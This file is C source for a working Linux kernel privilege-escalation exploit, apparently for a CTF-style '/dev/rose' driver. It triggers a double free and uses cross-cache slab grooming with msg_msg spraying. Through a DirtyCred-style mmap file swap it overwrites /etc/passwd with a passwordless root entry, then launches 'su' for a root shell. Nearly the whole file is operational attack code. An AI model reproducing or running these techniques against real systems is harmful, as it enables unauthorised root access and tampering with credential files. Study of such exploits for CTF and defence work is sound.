//gcc -pthread -no-pie -static ../../exploit.c  -o exp 
#define _GNU_SOURCE
#include <assert.h>
#include <fcntl.h>
#include <errno.h>
#include <inttypes.h>
#include <limits.h>
#include <pthread.h>
#include <signal.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <poll.h>
#include <stdnoreturn.h>
#include <string.h>
#include <unistd.h>
#include <linux/userfaultfd.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/timerfd.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/resource.h>
#include <linux/capability.h>
#include <sys/xattr.h>
#include <linux/io_uring.h>
#include <linux/membarrier.h>
#include <linux/io_uring.h>
#include <linux/membarrier.h>

#define logd(fmt, ...) fprintf(stderr, (fmt), ##__VA_ARGS__)

#define CC_OVERFLOW_FACTOR 5    // Used to handle fragmentation
#define OBJS_PER_SLAB 8         // Fetch this from /sys/kernel/slab/kmalloc-1k/objs_per_slab
#define CPU_PARTIAL 24          // Fetch this from /sys/kernel/slab/kmalloc-1k/cpu_partial
#define MSG_SIZE 0x400-48       // kmalloc-1k (because CONFIG_MEMCG_KMEM is disabled, we can use msg_msg)

static noreturn void fatal(const char *msg)
{
    perror(msg);
    exit(EXIT_FAILURE);
}

/* 
Cross-cache abstraction taken from https://org.anize.rs/HITCON-2022/pwn/fourchain-kernel
Notes that here is minor adjustments that we made to the abstraction
*/
enum {
    CC_RESERVE_PARTIAL_LIST = 0,
    CC_ALLOC_VICTIM_PAGE,
    CC_FILL_VICTIM_PAGE,
    CC_EMPTY_VICTIM_PAGE,
    CC_OVERFLOW_PARTIAL_LIST
};

struct cross_cache
{
    uint32_t objs_per_slab;
    uint32_t cpu_partial;
    struct
    {
        int64_t *overflow_objs;
        int64_t *pre_victim_objs;
        int64_t *post_victim_objs;
    };
    uint8_t phase;
    int (*allocate)(int64_t);
    int (*free)(int64_t);
};

static struct cross_cache *kmalloc1k_cc;
static inline int64_t cc_allocate(struct cross_cache *cc,
                                  int64_t *repo,
                                  uint32_t to_alloc)
{
    for (uint32_t i = 0; i < to_alloc; i++)
    {
        int64_t ref = cc->allocate(i);
        if (ref == -1)
            return -1;
        repo[i] = ref;
    }
    return 0;
}


static inline int64_t cc_free(struct cross_cache *cc,
                              int64_t *repo,
                              uint32_t to_free,
                              bool per_slab)
{
    for (uint32_t i = 0; i < to_free; i++)
    {
        // if per_slab is true, The target is to free one object per slab.
        if (per_slab && (i % (cc->objs_per_slab - 1)))
            continue;
        if (repo[i] == -1)
            continue;
        cc->free(repo[i]);
        repo[i] = -1;
    }
    return 0;
}

static inline int64_t reserve_partial_list_amount(struct cross_cache *cc)
{
    uint32_t to_alloc = cc->objs_per_slab * (cc->cpu_partial + 1) * CC_OVERFLOW_FACTOR;
    cc_allocate(cc, cc->overflow_objs, to_alloc); 
    return 0;
}

static inline int64_t allocate_victim_page(struct cross_cache *cc)
{
    uint32_t to_alloc = cc->objs_per_slab - 1;
    cc_allocate(cc, cc->pre_victim_objs, to_alloc);
    return 0;
}

static inline int64_t fill_victim_page(struct cross_cache *cc)
{
    uint32_t to_alloc = cc->objs_per_slab + 1;
    cc_allocate(cc, cc->post_victim_objs, to_alloc);
    return 0;
}

static inline int64_t empty_victim_page(struct cross_cache *cc)
{
    uint32_t to_free = cc->objs_per_slab - 1;
    cc_free(cc, cc->pre_victim_objs, to_free, false);
    to_free = cc->objs_per_slab + 1;
    cc_free(cc, cc->post_victim_objs, to_free, false);
    return 0;
}

static inline int64_t overflow_partial_list(struct cross_cache *cc)
{
    uint32_t to_free = cc->objs_per_slab * (cc->cpu_partial + 1) * CC_OVERFLOW_FACTOR;
    cc_free(cc, cc->overflow_objs, to_free, true); 
    return 0;
}

static inline int64_t free_all(struct cross_cache *cc)
{
    uint32_t to_free = cc->objs_per_slab * (cc->cpu_partial + 1)* CC_OVERFLOW_FACTOR;
    cc_free(cc, cc->overflow_objs, to_free, false);
    empty_victim_page(cc);

    return 0;
}

int64_t cc_next(struct cross_cache *cc)
{
    switch (cc->phase++)
    {
    case CC_RESERVE_PARTIAL_LIST:
        return reserve_partial_list_amount(cc);
    case CC_ALLOC_VICTIM_PAGE:
        return allocate_victim_page(cc);
    case CC_FILL_VICTIM_PAGE:
        return fill_victim_page(cc);
    case CC_EMPTY_VICTIM_PAGE:
        return empty_victim_page(cc); 
    case CC_OVERFLOW_PARTIAL_LIST:
        return overflow_partial_list(cc); 
    default:
        return 0;
    }
}

void cc_deinit(struct cross_cache *cc)
{
    free_all(cc);
    free(cc->overflow_objs);
    free(cc->pre_victim_objs);
    free(cc->post_victim_objs);
    free(cc);
}

void init_msq(int64_t *repo, uint32_t to_alloc ) {
    for (int i = 0; i < to_alloc ; i++) {
        repo[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
        if (repo[i] < 0) {
            logd("[-] msgget() fail\n");
            exit(-1);
        }
    }
}

struct cross_cache *cc_init(uint32_t objs_per_slab,
                            uint32_t cpu_partial,
                            void *allocate_fptr,
                            void *free_fptr)
{
    struct cross_cache *cc = malloc(sizeof(struct cross_cache));
    if (!cc)
    {
        perror("init_cross_cache:malloc\n");
        return NULL;
    }
    cc->objs_per_slab = objs_per_slab;
    cc->cpu_partial = cpu_partial;
    cc->free = free_fptr;
    cc->allocate = allocate_fptr;
    cc->phase = CC_RESERVE_PARTIAL_LIST;

    uint32_t n_overflow = objs_per_slab * (cpu_partial + 1) * CC_OVERFLOW_FACTOR;
    uint32_t n_previctim = objs_per_slab - 1; 
    uint32_t n_postvictim = objs_per_slab + 1; 

    cc->overflow_objs = malloc(sizeof(int64_t) * n_overflow);
    cc->pre_victim_objs = malloc(sizeof(int64_t) * n_previctim);
    cc->post_victim_objs = malloc(sizeof(int64_t) * n_postvictim);

    init_msq(cc->overflow_objs, n_overflow); 
    init_msq(cc->pre_victim_objs, n_previctim);
    init_msq(cc->post_victim_objs, n_postvictim);
    return cc;
}

static int rlimit_increase(int rlimit)
{
    struct rlimit r;
    if (getrlimit(rlimit, &r))
        fatal("rlimit_increase:getrlimit");

    if (r.rlim_max <= r.rlim_cur)
    {
        printf("[+] rlimit %d remains at %.lld", rlimit, r.rlim_cur);
        return 0;
    }
    r.rlim_cur = r.rlim_max;
    int res;
    if (res = setrlimit(rlimit, &r))
        fatal("rlimit_increase:setrlimit");
    else
        printf("[+] rlimit %d increased to %lld\n", rlimit, r.rlim_max);
    return res;
}

static int64_t cc_alloc_kmalloc1k_msg(int64_t msqid)
{
    struct {
        long mtype;
        char mtext[MSG_SIZE];
    } msg;
    msg.mtype = 1;
    memset(msg.mtext, 0x41, MSG_SIZE - 1);
    msg.mtext[MSG_SIZE-1] = 0;
    msgsnd(msqid, &msg, sizeof(msg.mtext), 0);
    return msqid;
}

static void cc_free_kmalloc1k_msg(int64_t msqid)
{
    struct {
        long mtype;
        char mtext[MSG_SIZE];
    } msg;
    msg.mtype = 0; 
    msgrcv(msqid, &msg, sizeof(msg.mtext), 0, IPC_NOWAIT | MSG_NOERROR); 
}

int open_rose() {
    return open("/dev/rose", O_RDWR);
}

int rose_fds[2];
int freed_fd = -1;
#define NUM_SPRAY_FDS 0x300
int main(void)
{
    puts("=======================");
    puts("[+] Initial setup");
    system("echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' > /tmp/a");
    rlimit_increase(RLIMIT_NOFILE);

    // Alloc the first rose
    // This will be used later to trigger double free
    rose_fds[0] = open_rose();

    puts("=======================");
    puts("[+] Try to free the page"); // Based on https://ruia-ruia.github.io/2022/08/05/CVE-2022-29582-io-uring/
    kmalloc1k_cc = cc_init(OBJS_PER_SLAB, CPU_PARTIAL, cc_alloc_kmalloc1k_msg, cc_free_kmalloc1k_msg);

     // Step 1
    puts("[+] Step 1: Allocate a lot of slabs (To be put in the partial list later)");
    cc_next(kmalloc1k_cc);

    // Step 2
    puts("[+] Step 2: Allocate target slab that we want to discard");
    cc_next(kmalloc1k_cc);

    // Step 3
    puts("[+] Step 3: Put rose in the target slab");
    rose_fds[1] = open_rose();

    // Step 4
    puts("[+] Step 4: Fulfill the target slab until we have a new active slab");
    cc_next(kmalloc1k_cc);

    // Step 5
    puts("[+] Step 5: Try to free rose & other objects with hope that the target slab will be empty + be put in the partial list");
    // Free rose, but rose_fds[0] also pointing to the same chunk,
    // and we can use rose_fds[0] later to free other chunk that resides in here
    close(rose_fds[1]);
    cc_next(kmalloc1k_cc);

    // Step 6
    puts("[+] Step 6: Fulfill the partial list and discard the target slab (because it's empty) to per_cpu_pages");
    cc_next(kmalloc1k_cc);
    // The page (order 1) will be discarded, and it goes to per_cpu_pages (__free_pages -> free_the_page -> free_unref_page -> free_unref_page_commit)
    // We need to make it goes to the free area instead of per_cpu_pages

    // Step 7
    puts("[+] Step 7: Make PCP freelist full, so that page goes to free area in buddy");
    cc_deinit(kmalloc1k_cc);
    // We try to make the page stored in pcp goes to free area by making
    // the pcp freelist full. 
    // Free all allocation that we've made before to trigger it, and after that
    // We can start our cross-cach exploitation.

    puts("=======================");
    puts("[+] Start the main exploit");

    // Trigger cross-cache, file will use the freed page
    puts("[+] Spray FDs");
    int spray_fds[NUM_SPRAY_FDS];
    for(int i =0;i<NUM_SPRAY_FDS;i++){
        spray_fds[i] = open("/tmp/a", O_RDWR); // /tmp/a is a writable file
        if (spray_fds[i] == -1)
            fatal("Failed to open FDs");
    }

    // Before: 2 fd 1 refcount (rose_fds[1] & spray_fds[i])
    puts("[+] Free one of the FDs via rose");
    close(rose_fds[0]);
    // After: 1 fd but pointed chunk is free

    // Spray to replace the previously freed chunk
    // Set the lseek to 0x8, so that we can find easily the fd
    puts("[+] Find the freed FD using lseek");
    int spray_fds_2[NUM_SPRAY_FDS];
    for (int i = 0; i < NUM_SPRAY_FDS; i++) {
        spray_fds_2[i] = open("/tmp/a", O_RDWR);
        lseek(spray_fds_2[i], 0x8, SEEK_SET);
    }
    // After: 2 fd 1 refcount (Because new file)

    // The freed fd will have lseek value set to 0x8. Try to find it.
    for (int i = 0; i < NUM_SPRAY_FDS; i++) {
        if (lseek(spray_fds[i], 0 ,SEEK_CUR) == 0x8) {
            freed_fd = spray_fds[i];
            lseek(freed_fd, 0x0, SEEK_SET);
            printf("[+] Found freed fd: %d\n", freed_fd);
            break;
        }
    }
    if (freed_fd == -1)
        fatal("Failed to find FD");

    // mmap trick instead of race with write
    puts("[+] DirtyCred via mmap");
    char *file_mmap = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, freed_fd, 0);
    // After: 3 fd 2 refcount (Because new file)

    close(freed_fd);
    // After: 2 fd 1 refcount (Because new file)

    for (int i = 0; i < NUM_SPRAY_FDS; i++) {
        close(spray_fds_2[i]);
    }
    // After: 1 fd 0 refcount (Because new file)
    // Effect: FD in mmap (which is writeable) can be replaced with RDONLY file

    for (int i = 0; i < NUM_SPRAY_FDS; i++) {
        spray_fds[i] = open("/etc/passwd", O_RDONLY);
    }
    // After: 2 fd 1 refcount (but writeable due to mmap)

    strcpy(file_mmap, "root::0:0:root:/root:/bin/sh\n");
    puts("[+] Finished! Open root shell...");
    puts("=======================");
    system("su");
    return 0;
}
